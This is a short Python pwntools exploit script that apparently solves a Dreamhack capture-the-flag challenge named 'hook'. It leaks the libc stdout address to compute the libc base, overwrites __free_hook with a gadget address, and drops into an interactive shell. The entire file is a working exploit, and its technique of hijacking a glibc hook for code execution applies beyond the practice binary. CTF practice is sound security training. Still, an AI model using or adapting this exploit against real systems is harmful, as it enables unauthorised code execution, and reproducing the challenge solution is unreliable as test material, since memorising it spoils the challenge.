#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./hook_patched',checksec=False)
libc = ELF('./libc.so.6',checksec=False)

system =0x0000000000400a11

# r = remote('host3.dreamhack.games',17208)
r = process(exe.path)
input()
r.recvuntil(b'stdout: ')
stdout = r.recv(14).decode()
libc.address = int(stdout,16) - libc.sym['_IO_2_1_stdout_']

log.info("stdout: " + stdout)
log.info("libc base: " + hex(libc.address))

free = libc.sym['__free_hook']
r.sendlineafter(b"Size: ",b'20')

payload = p64(free) + p64(system)
# print(len(payload))
r.sendafter(b'Data: ',payload)


r.interactive()